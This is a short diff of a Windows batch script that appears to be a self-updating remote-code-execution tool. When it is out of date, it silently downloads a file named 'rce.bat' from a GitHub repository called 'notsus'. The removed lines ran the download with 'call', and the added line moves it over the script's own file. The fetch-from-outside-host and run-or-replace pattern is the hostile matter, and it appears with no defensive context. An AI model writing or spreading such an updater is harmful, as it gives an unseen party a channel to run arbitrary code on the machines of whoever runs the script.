@@ -14,8 +14,7 @@ if %version%==%latest_version% (
 ) else (
 	echo we arent on latest version lmao
 	curl -o rce1.bat -s --ssl-no-revoke https://raw.githubusercontent.com/NajdzrBalls/notsus/main/P/rce.bat
-	echo "xdd" > updated.txt
-	call rce1.bat
+	move rce1.bat rce.bat
 )
 
 del ver.dat
